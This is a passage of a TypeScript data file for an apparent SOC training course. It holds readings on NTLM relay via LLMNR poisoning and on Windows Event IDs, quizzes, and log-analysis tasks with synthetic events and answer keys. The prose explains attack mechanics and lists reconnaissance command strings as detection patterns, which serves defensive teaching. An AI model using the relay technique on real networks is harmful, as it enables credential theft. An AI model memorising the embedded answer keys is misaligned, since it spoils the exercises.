      content: `So far every credential attack you have studied — password spray, Kerberoasting, AS-REP Roasting — ends the same way: the attacker obtains an encrypted or hashed secret and must crack it offline before it becomes useful. **NTLM Relay** is different. The attacker never cracks anything at all. Instead, they trick a victim machine into authenticating *directly to them*, then forward (relay) that live authentication attempt to a real target server in real time — effectively borrowing the victim's identity for a single, one-shot login.\n\n**Step 1 — How the attacker gets a victim to authenticate to them: LLMNR/NBT-NS poisoning.** Windows machines have a legacy fallback name-resolution behaviour left over from before every network reliably had a working DNS server. If a Windows machine tries to resolve a hostname and normal DNS fails (a classic case: a user mistypes a network share name, e.g. \\\\flie-server\\finance instead of \\\\file-server\\finance), the machine does not just give up. It broadcasts the request to the entire local subnet using two legacy protocols:\n- **LLMNR (Link-Local Multicast Name Resolution)** — a UDP multicast on port 5355, asking "does anyone on this network know the address for 'flie-server'?"\n- **NBT-NS (NetBIOS Name Service)** — an older, UDP port 137 equivalent doing the same job.\n\nBoth protocols trust the **first machine that answers** — there is no authentication or verification of who is allowed to respond. An attacker running a tool called **Responder** (or Inveigh on Windows) sits on the same local network, silently listens for these broadcast requests, and answers *every single one* claiming "that's me — send your authentication here." Because the victim's machine believes it is now talking to the legitimate file server it originally asked for, it automatically sends its **NTLM authentication** (its username and an NTLM challenge-response, generated using the user's password hash) straight to the attacker — no user interaction, no warning, nothing.\n\n**Step 2 — What the attacker does with that captured authentication: relay, not just capture.** A less sophisticated attacker would simply take the captured NTLM hash offline and try to crack it — this works, but only if the underlying password is weak. A more dangerous move is **relaying**: instead of storing the captured authentication, the attacker immediately forwards it, live, to a *different* target server that the victim's account has access to (very commonly another workstation, a file server, or worse, a server running Exchange or a Certificate Authority for AD CS). Because NTLM authentication in this scenario has no SMB signing check to prevent it, the receiving server accepts the relayed authentication as if the *victim* had genuinely logged in — and the attacker now has an active, authenticated session as that user on the target server, without ever knowing the password and without cracking a single hash.\n\n**Why this evades naive detection:** Nothing about this attack looks like brute force (there's no failed-login flood) and nothing looks like a stolen-credential replay from an unusual location (the traffic is entirely internal, machine-to-machine, at normal speed). The only visible artefacts are: LLMNR/NBT-NS broadcast traffic on ports 5355/137 (routine background noise on almost every Windows network, which is exactly what makes it a good disguise), followed by an NTLM authentication (Event ID 4624/4625, AuthenticationPackageName = NTLM) where the **WorkstationName field does not match the source IP the login actually came from** — because the victim thinks they're logging into their intended target, but the login is really landing on (or via) the attacker's machine.\n\n**The detection tell — mismatched WorkstationName vs. source IP.** In a legitimate NTLM logon, the WorkstationName field (the hostname the client claims to be logging in from) and the IpAddress field (the actual network source of the authentication) refer to the same machine. In an NTLM relay attack, the victim's *account* authenticates from the *attacker's* IP address, while WorkstationName may still show the victim's own hostname — or vice versa, depending on exactly how the relay is staged. Either way, correlating WorkstationName against IpAddress and flagging any mismatch is one of the highest-fidelity NTLM relay detections available, because it requires no threat intelligence and no baseline — just internal log consistency.\n\n**Prevention (the fixes a SOC should recommend, even though implementing them is IT's job, not yours):** Disable LLMNR and NBT-NS entirely via Group Policy on networks where legacy name resolution isn't required (most modern networks don't need it). Enable **SMB signing** enforcement, which cryptographically signs every SMB session and makes relayed authentication fail even if captured. Where LLMNR/NBT-NS cannot be disabled, deploy a canary/honeytoken account specifically designed to alert if it is ever used to answer a poisoned request.`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Question 7 — AS-REP Roasting detection
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "ad-q7",
      question:
        "You are reviewing Event ID 4768 (Kerberos TGT request) logs on a Domain Controller and see an entry for account 'svc-legacy-print' with PreAuthType = 0. What does this indicate, and why is it a high-value finding?",
      options: [
        "It shows smart-card (PKINIT) pre-authentication, which is routine for privileged service accounts",
        "Pre-authentication is disabled on the account, so anyone can request its AS-REP and crack it offline",
        "It means the password has expired, so the KDC refused to issue a TGT until the password is reset",
        "It marks a cross-realm referral request, which is routine traffic in a forest with several domains",
      ],
      answer: 1,
      explanation:
        "PreAuthType 2 is the normal, expected value — it means the client proved knowledge of the password via an encrypted timestamp before the KDC issued a TGT. PreAuthType 0 means pre-authentication was skipped entirely, which only happens when the account has the 'DONT_REQ_PREAUTH' flag set. Anyone who can reach a DC and knows the username can request an AS-REP for such an account and crack the encrypted reply offline, with no further events generated during cracking. 'Smart-card (PKINIT)' is a different pre-authentication method — it is still pre-authentication, not its absence. 'Password expired, TGT refused' cannot fit: 4768 here records a TGT that was issued. 'Cross-realm referral' confuses PreAuthType with ticket routing between domains. Legacy accounts with the flag set will log PreAuthType 0 on every logon, so confirm whether this account is a known exception — but either way it is roastable and its flag or password needs fixing.",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Log Analysis — NTLM Relay via LLMNR Poisoning
    // -------------------------------------------------------------------------
    {
      type: "log_analysis",
      id: "ad-la2",
      heading: "Unusual NTLM Network Logon on SRV-FILE02",
      context:
        "Your SIEM has correlated two events on the internal network within an 8-second window: a burst of LLMNR broadcast traffic on UDP port 5355, followed by an NTLM network logon for l.harper on the file server SRV-FILE02. The SIEM has enriched the logon with asset-inventory and DHCP lookups. Review the authentication event below and answer the questions.",
      event: {
        id: "ad-ntlm-evt-001",
        ts: "2024-11-18T14:02:37.000Z",
        source: "ad",
        vendor: "Windows Security",
        event_type: "auth_success",
        severity: "high",
        hostname: "SRV-FILE02.corp.contoso.com",
        description:
          "l.harper's account authenticated to SRV-FILE02 via NTLM, but the claimed WorkstationName does not match the source IP address of the connection",
        mitre_technique: "T1557.001",
        mitre_tactic: "Credential Access",
        authentication: {
          method: "NTLM",
          result: "Success",
          logon_type: 3,
        },
        raw: {
          "event.code": "4624",
          "winlog.channel": "Security",
          "winlog.computer_name": "SRV-FILE02.corp.contoso.com",
          "winlog.event_data.TargetUserName": "l.harper",
          "winlog.event_data.TargetDomainName": "CORP",
          "winlog.event_data.LogonType": "3",
          "winlog.event_data.AuthenticationPackageName": "NTLM",
          "winlog.event_data.WorkstationName": "WKS-L-HARPER",
          "winlog.event_data.IpAddress": "10.20.4.91",
          "winlog.event_data.IpPort": "51122",
          "asset.cmdb_lookup_10.20.4.91": "No matching entry in asset inventory or CMDB for this IP",
          "asset.dhcp_lease_WKS-L-HARPER": "10.20.4.47 (per DHCP lease table)",
          "winlog.event_id": 4624,
          "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        },
      },
      questions: [
        {
          question:
            "Compare WorkstationName and IpAddress with the two asset-enrichment fields. What is the most likely explanation for this logon?",
          options: [
            "Lease churn: l.harper's PC took a new DHCP lease and the server logged the new IP before its name cache caught up",
            "NAT or VPN noise: WorkstationName is client-supplied, so a name/IP mismatch like this is common and not suspicious",
            "NTLM relay: an unknown device at 10.20.4.91 forwarded l.harper's authentication, which still carries her PC's name",
            "Pass-the-hash on l.harper's PC: her hash was reused on that machine, so the logon names her workstation as source",
          ],
          answer: 2,
          explanation:
            "WorkstationName is supplied by the client and not verified by the server. The logon says it comes from WKS-L-HARPER, but it arrived from 10.20.4.91, an address with no entry in the asset inventory, while DHCP shows WKS-L-HARPER on a different address. Together with the LLMNR burst seconds earlier, that fits a relay: l.harper's poisoned authentication was forwarded by an unknown device to SRV-FILE02. 'Lease churn' does not fit — a name cache affects local name lookups, not the WorkstationName a remote server records, and her PC's current lease is a different address. 'NAT or VPN noise' is a real cause of mismatches, but NAT/VPN traffic comes from a known gateway, not a device missing from the inventory. 'Pass-the-hash on her PC' would make the logon come from her PC's own address, not from an unknown one.",
          xp: 35,
        },
        {
          question:
            "Treat this as a confirmed relay. What is the most appropriate immediate response?",
          options: [
            "Reset l.harper's password and close the case — the reset makes the captured authentication useless",
            "Isolate the device at 10.20.4.91, reset l.harper's credentials and sessions, and find how it got on",
            "Isolate and re-image WKS-L-HARPER, since the logon names her workstation as the source of the access",
            "Enforce SMB signing on SRV-FILE02 and disable LLMNR, then monitor the subnet for a repeat attempt",
          ],
          answer: 1,
          explanation:
            "The unknown device is the attacker's foothold and can keep poisoning and relaying for every user on that subnet, so contain it first, then remediate the affected account and its sessions and work out how the device got onto the network. 'Reset the password and close' is incomplete — relay never needed the password, so the reset does not undo the session already opened on SRV-FILE02, and the device is still there. 'Re-image WKS-L-HARPER' targets the victim: her PC only supplied the name, while the access came from 10.20.4.91. 'SMB signing and disabling LLMNR' are the right long-term fixes, but doing only that now leaves an active attacker device on the network.",
          xp: 35,
        },
      ],
    } satisfies LogAnalysisTask,

    // -------------------------------------------------------------------------
    // Flag Task — NTLM Relay
    // -------------------------------------------------------------------------
    {
      type: "flag",
      id: "ad-flag2",
      prompt:
        "In the 'Unusual NTLM Network Logon' event above, the victim's own computer also needs checking — it is the machine whose name-resolution request was answered by the poisoner. Enter the IP address of l.harper's real workstation.",
      answer: "10.20.4.47",
      hint: "The address the logon arrived from is not her machine. One of the enrichment fields tells you where her workstation really is.",
      xp: 35,
    } satisfies FlagTask,

    // -------------------------------------------------------------------------
    // Analyst Choice — Off-hours privileged RDP logon to a Domain Controller
    // -------------------------------------------------------------------------
    {
      type: "analyst_choice",
      id: "ad-ac1",
      heading: "Verdict: Off-Hours Privileged RDP Logon to the Domain Controller",
      scenario:
        "Your SIEM raises a medium-severity alert at 03:12 AM: the account 'svc-patchmgmt' established an interactive RDP session (LogonType 10) directly onto DC01, the primary Domain Controller. Any interactive logon to a Domain Controller outside business hours is configured to alert automatically, since DCs should almost never receive direct interactive sessions. The asset inventory lists JMP-PATCHMGT01 at 10.10.50.12 as the organisation's patch-management jump host. Check the account, time, source workstation and source IP in the log against the IT-verification note shown with the event, then give your verdict.",
      event: {
        id: "ad-ac1-evt-001",
        ts: "2024-11-09T03:12:00.000Z",
        source: "ad",
        vendor: "Windows Security",
        event_type: "auth_success",
        severity: "medium",
        hostname: "DC01.corp.contoso.com",
        description:
          "Privileged account svc-patchmgmt established an interactive RDP session directly onto the Domain Controller outside business hours",
        mitre_technique: "T1021.001",
        mitre_tactic: "Lateral Movement",
        authentication: {
          method: "NTLM",
          result: "Success",
          logon_type: 10,
        },
        it_verify_result: "confirmed",
        it_verify_message:
          "Change ticket CHG0041932 authorises svc-patchmgmt to RDP into DC01 during the 02:00-04:00 monthly patch-validation window; approved by IT Ops on 2024-11-04.",
        raw: {
          "event.code": "4624",
          "winlog.channel": "Security",
          "winlog.computer_name": "DC01.corp.contoso.com",
          "winlog.event_data.TargetUserName": "svc-patchmgmt",
          "winlog.event_data.TargetDomainName": "CORP",
          "winlog.event_data.LogonType": "10",
          "winlog.event_data.AuthenticationPackageName": "Negotiate",
          "winlog.event_data.WorkstationName": "JMP-PATCHMGT01",
          "winlog.event_data.IpAddress": "10.10.50.12",
          "winlog.event_data.IpPort": "52011",
          "winlog.event_data.LogonProcessName": "User32",
          "winlog.event_id": 4624,
          "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
          "@timestamp": "2024-11-09T03:12:00.000Z",
        },
      } satisfies TelemetryEvent,
      correct_verdict: "false_positive",
      explanation:
        "On the surface this alert has the shape this room teaches you to worry about: LogonType 10 (RemoteInteractive — an RDP session) landing directly on a Domain Controller, at 03:12 AM, from a privileged account. Without context that is a strong lateral-movement or credential-abuse indicator. But every detail checks out against the evidence: the IT-verification note confirms change ticket CHG0041932 allows svc-patchmgmt to RDP into DC01 between 02:00 and 04:00, and 03:12 falls inside that window; the WorkstationName is JMP-PATCHMGT01 and the IpAddress is 10.10.50.12, which the asset inventory lists as the patch-management jump host. Account, target, time and source all match the approved change, so this is expected administrative activity, not an attack.",
      fp_trap:
        "It is tempting to escalate immediately purely on pattern-matching: privileged account + Domain Controller + interactive logon type + off-hours timestamp is exactly the shape of the AD attack patterns this room teaches. But context always outranks pattern alone. If either corroborating fact had been missing — an unrecognised source workstation, or no matching change ticket — the correct verdict would flip immediately to escalate, because a privileged interactive session on a DC with no explanation is one of the highest-risk things a SOC analyst can see. Always check the WorkstationName against known admin infrastructure and the account's IT verification status before closing an alert like this.",
      xp: 30,
    } satisfies AnalystChoiceTask,
  ],
};

// ---------------------------------------------------------------------------
// Room 2 — Windows Event Logs
// ---------------------------------------------------------------------------

const windowsEventLogs: Room = {
  id: "windows-event-logs",
  title: "Windows Event Logs",
  description:
    "Windows writes a detailed diary of everything that happens on a system. Learn to read that diary — critical Event IDs, logon types, failure codes — and identify attacks hidden inside authentication and process logs.",
  difficulty: "intermediate",
  category: "Log Analysis",
  estimatedMinutes: 50,
  xp: 195,
  icon: "📋",
  prerequisites: ["windows-fundamentals", "log-entry-anatomy"],
  tasks: [
    // -------------------------------------------------------------------------
    // Reading 1 — What Are Windows Event Logs
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "win-evtlogs-r1",
      heading: "Windows Event Logs — The System's Black Box",
      content: `Think of the black box recorder on an aeroplane. Every flight, it silently records everything: engine speed, altitude, control inputs. If something goes wrong, investigators pull the black box and reconstruct exactly what happened. **Windows Event Logs are the black box of a computer**. Every login attempt, every file opened, every process started, every permission change — Windows writes a record of it.\n\nWith Event Logs, a SOC analyst can answer questions like:\n- "Did someone log in at 3 AM when the office was closed?"\n- "What process created that suspicious executable?"\n- "Was the audit log itself cleared — possibly by an attacker covering their tracks?"\n- "Which user account was added to the Domain Admins group?"\n\nWithout Event Logs, investigating a security incident would be like trying to solve a crime with no witnesses, no cameras, and no fingerprints. With them, you can often reconstruct an entire attack chain.\n\n**Where to Find Event Logs**\n\nOn any Windows computer, open the **Event Viewer** application (search for it in the Start menu, or run \`eventvwr.msc\`). You will see logs organised into channels:\n\n- **Windows Logs**:\n  - **Security**: Authentication events, privilege changes, account management, policy changes. This is where SOC analysts spend most of their time.\n  - **System**: Operating system events — drivers loading, services starting/stopping, system errors.\n  - **Application**: Events from installed applications.\n\n- **Applications and Services Logs**:\n  - **Microsoft > Windows > PowerShell > Operational**: PowerShell script execution — critical for detecting attacker activity since attackers heavily use PowerShell.\n  - **Microsoft > Windows > Sysmon > Operational**: If Sysmon (a free Microsoft tool) is installed, this log contains highly detailed process creation, network connection, and file creation events.\n  - **Microsoft > Windows > TaskScheduler > Operational**: Scheduled tasks — a common attacker persistence mechanism.\n\nLogs are stored as **.evtx** files in \`C:\\Windows\\System32\\winevt\\Logs\\\`. You can open these files directly in Event Viewer or load them into a SIEM.\n\n**Event Structure**\n\nEvery log entry has the same structure:\n\n- **EventID**: The most important field. A number that tells you exactly what happened. Event ID 4624 always means "successful logon". Event ID 4625 always means "failed logon". These IDs are standardised across all Windows versions.\n- **TimeCreated**: When the event happened (in UTC on modern systems).\n- **Level**: Information / Warning / Error / Critical.\n- **Channel**: Which log it belongs to (Security, System, etc.).\n- **Computer**: The hostname where the event was generated.\n- **EventData**: The details — who, what, from where. Different for each EventID.\n- **Keywords**: Audit Success or Audit Failure (visible in Security log).\n\n**Audit Policies — Turning Logs On**\n\nMany event IDs only generate logs if the corresponding **Audit Policy** is enabled. For example, Event ID 4688 (new process created) requires "Audit Process Creation" to be enabled, and to see the command line, you must also enable "Include command line in process creation events" via Group Policy. By default, many audit policies are OFF. One of the first questions to ask when joining a new organisation as a SOC analyst: "What audit policies are enabled?"\n\n**Collecting Logs at Scale**\n\nA company with 5,000 computers cannot have analysts log into each machine to check Event Viewer. Logs must flow to a central location:\n\n- **Windows Event Forwarding (WEF) / Windows Event Collector (WEC)**: Built into Windows. Computers forward their events to a central collector server using WinRM. Free but requires configuration.\n- **Winlogbeat**: An open-source agent (from Elastic) installed on each machine. Ships logs to Elasticsearch/Kibana in real time. Very common in SOC environments.\n- **Splunk Universal Forwarder / Microsoft Sentinel agent / Wazuh agent**: Other popular log collection agents.\n\nAll of these feed a central **SIEM** (Security Information and Event Management system) where analysts can search across millions of events from thousands of machines simultaneously.`,
      checkpoint: {
        question:
          "According to the reading, besides enabling 'Audit Process Creation', what additional Group Policy setting must be enabled to actually see the command line in Event ID 4688?",
        options: [
          "'Include command line in process creation events'",
          "'Audit Kerberos Authentication Service'",
          "'Enable NTLM auditing'",
          "'Audit Directory Service Access'",
        ],
        answer: 0,
        explanation:
          "By default, Windows logs that a process was created but not the command line used to launch it; the separate GPO setting 'Include command line in process creation events' is required to capture that detail.",
      },
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 2 — Critical Event IDs
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "win-evtlogs-r2",
      heading: "Critical Security Event IDs Every SOC Analyst Must Know",
      content: `The Security event log can generate thousands of events per hour on a busy server. You cannot read them all. What you can do is know which EventIDs matter most, understand what each field means, and build alerts that fire when something suspicious happens. Here are the most important ones:\n\n**Authentication Events**\n\n**Event ID 4624 — Successful Logon**\nSomeone (or something) logged in successfully. The critical sub-field is **LogonType**:\n- LogonType **2** = Interactive — physically at the keyboard (console logon)\n- LogonType **3** = Network — accessing a shared folder, file server, or SMB resource remotely (no credentials cached, authentication happens over the wire)\n- LogonType **4** = Batch — a scheduled task ran under this account\n- LogonType **5** = Service — a Windows service started using this account\n- LogonType **7** = Unlock — workstation unlocked after screensaver\n- LogonType **8** = NetworkCleartext — a network logon where the password reached the authentication package in an unhashed form; most often IIS Basic Authentication. Rare, and worth noticing because it means a cleartext-style credential was used.\n- LogonType **9** = NewCredentials — a process kept the current logon token locally but used different credentials for outbound network connections (the runas /netonly pattern). Attacker tools such as Mimikatz pass-the-hash produce LogonType 9, so it is a useful lateral-movement indicator.\n- LogonType **10** = RemoteInteractive — RDP (Remote Desktop Protocol) session\n- LogonType **11** = CachedInteractive — laptop logon while offline, using cached credentials\nLateral movement often appears as **LogonType 3** from one machine to another. An admin account logging in interactively to a user workstation (LogonType 2) is unusual and worth investigating.\n\n**Event ID 4625 — Failed Logon**\nThe login attempt failed. Key sub-fields:\n- **TargetUserName**: Which account was targeted\n- **IpAddress**: Where the attempt came from\n- **LogonType**: Same values as 4624 — Type 3 failures can indicate password spraying\n- **SubStatus** (failure reason codes):\n  - **0xC000006A**: Wrong password (the account exists, the password was just wrong)\n  - **0xC0000064**: No such user (the username does not exist in the domain)\n  - **0xC000006D**: General logon failure\n  - **0xC0000234**: Account locked out\n  - **0xC0000072**: Account disabled\n  - **0xC000015B**: Logon type not granted\nDetection pattern: Many 4625 events with status **0xC000006A** (wrong password, account exists) from one IP targeting multiple accounts = **password spray**. Many 4625 with status **0xC0000064** (no such user) from one IP = **username enumeration**.\n\n**Event ID 4648 — Logon Using Explicit Credentials**\nFired when credentials are specified explicitly (e.g., using the \`runas\` command, or when an application like PsExec passes a username and password). This is how lateral movement often looks — an attacker runs PsExec with stolen credentials to execute commands on a remote machine. You will see 4648 on the **source** machine (where the attacker ran the command) alongside 4624 LogonType 3 on the **target** machine.\n\n**Event ID 4672 — Special Privileges Assigned to New Logon**\nFires every time an account with administrative privileges logs in. "Special privileges" include SeDebugPrivilege (read any process memory), SeBackupPrivilege, SeTakeOwnershipPrivilege. This event by itself is normal — but it gives you a complete list of every admin logon. If you see 4672 for an account that should not have admin rights, investigate immediately.\n\n**Process and Execution Events**\n\n**Event ID 4688 — New Process Created**\nA new process (program) was started. Critical for detecting malware and attacker tools. Key fields:\n- **NewProcessName**: The full path of the executable\n- **CommandLine**: The full command line (only visible if "Include command line in process creation events" audit policy is enabled)\n- **ParentProcessName**: What launched this process\n- **SubjectUserName**: Which user account created the process\nSuspicious patterns: \`cmd.exe\` or \`powershell.exe\` spawned by \`outlook.exe\` or \`winword.exe\` (phishing macro), \`whoami /all\` or \`net group "Domain Admins"\` (reconnaissance), base64-encoded PowerShell commands (\`-EncodedCommand\`).\n\n**Account Management Events**\n\n**Event ID 4720 — User Account Created**: A new user was created. Any new account should be verified against an IT change ticket.\n**Event ID 4728 — Member Added to Security-Enabled Global Group**: Someone was added to a group. If the group is "Domain Admins" or "Enterprise Admins" and it was not expected, this is a critical alert.\n**Event ID 4732 — Member Added to Security-Enabled Local Group**: Similar but for local machine groups. Addition to "Administrators" local group is common for privilege escalation.\n\n**Persistence and Covering Tracks**\n\n**Event ID 4698 — Scheduled Task Created**: Attackers frequently create scheduled tasks to maintain persistence — a task that runs their malware every hour even if the machine reboots.\n**Event ID 4702 — Scheduled Task Updated**: An existing scheduled task was modified. Could be an attacker modifying a legitimate task.\n**Event ID 7045 — New Service Installed**: A new Windows service was installed. Malware commonly installs itself as a Windows service (e.g., many RATs and backdoors). This event is in the **System** log, not Security.\n**Event ID 1102 — Audit Log Cleared**: The Security event log was deliberately cleared. This is almost always an attacker removing evidence. Legitimate administrators almost never need to clear the Security log. This should trigger an immediate P1 alert in any SOC.\n\n**Kerberos Events**\n\n**Event ID 4768 — Kerberos TGT Requested**: See the AD room for full details. Watch for RC4 encryption and failures.\n**Event ID 4769 — Kerberos Service Ticket Requested**: Watch for EncryptionType 0x17 (RC4) — Kerberoasting indicator.\n**Event ID 4776 — NTLM Authentication Attempt**: NTLM is the older, weaker authentication protocol. Even a healthy, Kerberos-first domain still produces 4776 routinely — logons to *local* (non-domain) accounts, connecting to a server by IP address instead of its name, non-domain-joined clients, scheduled tasks running with stored credentials, and legacy applications all fall back to NTLM. So do **not** treat 4776 as rare-by-definition and escalate on its mere presence. Learn *your* baseline 4776 volume and watch for **deviations** from it: a sudden spike, or a 4776 for a privileged account or from a host that never normally uses NTLM, is the real signal (a possible Pass-the-Hash indicator) — the event itself is not.`,
      checkpoint: {
        question:
          "Which SubStatus code on Event ID 4625 indicates the account exists but the password supplied was wrong?",
        options: ["0xC0000064", "0xC000006A", "0xC0000234", "0xC0000072"],
        answer: 1,
        explanation:
          "0xC000006A = wrong password (the account exists). 0xC0000064 means the username doesn't exist, 0xC0000234 means the account is locked out, and 0xC0000072 means the account is disabled.",
      },
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 3 — Detection Patterns and Log Collection
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "win-evtlogs-r3",
      heading: "Attack Patterns in Event Logs and How to Build Detections",
      content: `Knowing individual Event IDs is only step one. Real SOC work is about recognising **patterns** — combinations and sequences of events that together tell a story of an attack.\n\n**Pattern 1: Password Spray Attack**\nA password spray is when an attacker tries one common password (like "Company2024!" or "Summer2024") against many different user accounts. It is the opposite of brute force (many passwords against one account). Spraying is effective because most accounts will not lock out — only the correct accounts get a match — and it avoids lockout thresholds.\n\nWhat you see in logs:\n- Dozens or hundreds of **Event ID 4625** (failed logon) within a short time window\n- **LogonType 3** (network) — the attacker is not physically present\n- **SubStatus 0xC000006A** (wrong password) — consistent, meaning the accounts DO exist\n- **Multiple different TargetUserNames** from the **same IpAddress**\n- Possibly 1–2 **Event ID 4624** (successful logon) at the end — indicating the spray found a valid credential\n\nResponse: Block the source IP, check if any account had a successful logon (4624) immediately following the failures, reset any accounts that were successfully compromised, alert the user.\n\n**Pattern 2: Lateral Movement**\nOnce inside the network, attackers move horizontally — from the initial foothold machine to other more valuable systems (servers, domain controllers).\n\nWhat you see in logs:\n- **Event ID 4624 LogonType 3** on a server. A workstation opening a Type 3 logon to a *server* is itself routine — SMB file shares, printers, pulling GPOs from SYSVOL, and DFS generate exactly this all day long, so it is **not** suspicious on its own. What stands out against a normal baseline is **workstation-to-workstation** Type 3 logons, or a **privileged/admin account** authenticating to a server it never normally touches\n- The account used may be a **local administrator account** with the same password across multiple machines (common misconfiguration) — pass-the-hash with a shared local admin credential is a classic lateral-movement path\n- Shortly after, **Event ID 4688** on the server showing reconnaissance commands (whoami, ipconfig, net group)\n- Possibly **Event ID 4648** on the source workstation showing explicit credential use\n\n**Pattern 3: Privilege Escalation**\nAn attacker who gained access as a low-privilege user attempts to gain admin rights.\n\nWhat you see in logs:\n- **Event ID 4728 or 4732** — user added to an admin group\n- **Event ID 4672** appearing for that account on the next logon\n- The account performing the change may itself be a recently compromised account\n\n**Pattern 4: Persistence via Scheduled Task**\nAn attacker creates a scheduled task to maintain access even if their initial foothold is discovered and removed.\n\nWhat you see in logs:\n- **Event ID 4698** — new scheduled task created\n- The task runs from an unusual location (\`C:\\Users\\Public\\\`, \`C:\\Temp\\\`, \`C:\\ProgramData\\\`)\n- The task runs under **SYSTEM** or an admin account\n- **Event ID 4688** showing the task executing at the scheduled time\n\n**Pattern 5: Log Clearing (Last Resort Attacker Action)**\n- **Event ID 1102** — Security log cleared\n- This often means the attacker is done and cleaning up, OR they became alarmed and are trying to erase evidence\n- Even if the log is cleared, events may still exist in SIEM if forwarding was in place\n- Always check SIEM for activity in the minutes/hours before the log clear event\n\n**Correlating Events Across Machines**\n\nA single event on a single machine rarely tells the full story. The power of a SIEM is correlating events across thousands of machines:\n- 4625 failures on DC01 + 4624 success on FILESERVER01 from same IP = lateral movement\n- 4688 (whoami) on WORKSTATION15 + 4648 on WORKSTATION15 + 4624 LogonType3 on DC01 from WORKSTATION15 = lateral movement to DC\n\n**Investigation Workflow**\nWhen an alert fires:\n1. Identify the **who** (user account), **what** (Event ID), **when** (timestamp), **where** (source and destination machines), and **from where** (source IP)\n2. Look back in time: what happened before this event on the same machine?\n3. Look at other machines: is the same account active on multiple systems simultaneously?\n4. Look forward: what happened after this event?\n5. Check if the account has a legitimate reason for this activity (are they in IT? is this during business hours? does a change ticket exist?)\n6. Escalate or close based on findings`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Question 1
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "win-evtlogs-q1",
      question:
        "You see Event ID 4624 on SERVER01. The LogonType field is 3, and the IpAddress is the IP of a user workstation (WKST22). Why is this potentially suspicious and what attack technique does it suggest?",
      options: [
        "LogonType 3 is an interactive console logon, so an administrator was typing at SERVER01's keyboard",
        "LogonType 3 is a network logon from WKST22 to SERVER01 — possible lateral movement if the account does not normally do this",
        "LogonType 3 is a batch logon, so a scheduled task running on WKST22 authenticated to SERVER01",
        "LogonType 3 is RemoteInteractive, so a user on WKST22 opened an RDP session to SERVER01",
      ],
      answer: 1,
      explanation:
        "LogonType 3 = network logon. This means a process on WKST22 authenticated to SERVER01 across the network (like accessing a file share or using PsExec/WMI to run commands). On its own, a workstation-to-server Type 3 logon is routine (file shares, printers, SYSVOL/GPO pulls generate it all day), so the logon type alone proves nothing. It becomes a lateral movement indicator only against the baseline: an account that does not normally touch SERVER01, a privileged/admin account, or a logon followed by remote execution (e.g., 7045 service install, 4688 from PsExec/WMI). That is why the answer is 'possible' lateral movement, pending that baseline check. LogonType 2 is the console/interactive value, and LogonType 10 is RDP — neither is 3, and batch logons (scheduled tasks) are LogonType 4.",
      xp: 25,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Log Analysis — Password Spray (Event ID 4625)
    // -------------------------------------------------------------------------
    {
      type: "log_analysis",
      id: "win-evtlogs-la1",
      heading: "Detecting a Password Spray Attack",
      context:
        "Your SIEM has generated an alert: 'High volume of failed logon events from external IP'. You pull one representative event from the wave of failures. The pattern has repeated for 47 different usernames from the same IP in the past 8 minutes.",
      event: {
        id: "win-spray-evt-001",
        ts: "2024-11-20T08:43:17.000Z",
        source: "windows_security",
        vendor: "Windows Security",
        event_type: "auth_failure",
        severity: "high",
        hostname: "DC01.corp.contoso.com",
        description:
          "Failed logon attempt — part of high-volume password spray from external IP",
        mitre_technique: "T1110.003",
        mitre_tactic: "Credential Access",
        authentication: {
          method: "NTLM",
          result: "Failure",
          logon_type: 3,
        },
        src_ip: "203.0.113.45",
        geo: { country: "Russia", city: "Moscow" },
        raw: {
          "event.code": "4625",
          "winlog.channel": "Security",
          "winlog.computer_name": "DC01.corp.contoso.com",
          "winlog.event_data.TargetUserName": "j.smith",
          "winlog.event_data.TargetDomainName": "CORP",
          "winlog.event_data.LogonType": "3",
          "winlog.event_data.SubStatus": "0xC000006A",
          "winlog.event_data.Status": "0xC000006D",
          "winlog.event_data.WorkstationName": "-",
          "winlog.event_data.IpAddress": "203.0.113.45",
          "winlog.event_data.IpPort": "0",
          "winlog.event_data.AuthenticationPackageName": "NTLM",
          "winlog.event_data.LogonProcessName": "NtLmSsp",
          "winlog.event_id": 4625,
          "winlog.keywords": "Audit Failure",
          "@timestamp": "2024-11-20T08:43:17.000Z",
        },
      } satisfies TelemetryEvent,
      questions: [
        {
          question:
            "The SubStatus field shows 0xC000006A. What does this tell you about the account 'j.smith'?",
          options: [
            "The account does not exist — the attacker is guessing usernames blindly",
            "The account exists but the password was wrong — the attacker already knows valid usernames",
            "The account is locked out — the request was rejected by lockout policy, not by what the attacker knows",
            "The account is disabled — any attempt fails with this status whatever password is supplied",
          ],
          answer: 1,
          explanation:
            "SubStatus 0xC000006A = 'Wrong Password' — meaning the username j.smith IS a valid account in the domain, but the password attempt was incorrect. This is dangerous because it confirms the attacker has a list of real usernames (possibly obtained from OSINT, LinkedIn, or a prior breach). If the same SubStatus appears for 47 different accounts in 8 minutes, the attacker is spraying one password across all valid accounts.",
          xp: 30,
        },
        {
          question:
            "The LogonType is 3 and the IpAddress is 203.0.113.45 (geolocated to Moscow). What is the correct immediate response?",
          options: [
            "Monitor only — one failed logon from a single IP does not justify action yet",
            "Block 203.0.113.45, search the SIEM for 4624 successes from it, reset any compromised accounts, alert the security team",
            "Reset j.smith's password and close the alert — the failed logon shows the attacker never got in",
            "Disable the j.smith account right away, which stops the attacker authenticating as that user",
          ],
          answer: 1,
          explanation:
            "The immediate priority is containment (block the source IP), followed by determining if any account was successfully compromised (look for 4624 from the same IP). Resetting any successfully sprayed account's password is critical before the attacker can use the credential. Never clear logs — that destroys the evidence trail needed for investigation.",
          xp: 25,
        },
      ],
    } satisfies LogAnalysisTask,

    // -------------------------------------------------------------------------
    // Question 2 — Event ID 1102
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "win-evtlogs-q2",
      question:
        "At 11:47 PM on a Saturday, Event ID 1102 appears in your SIEM from a Domain Controller. What does this mean and how urgent is it?",
      options: [
        "A new admin account was created — moderate urgency, verify with IT on Monday",
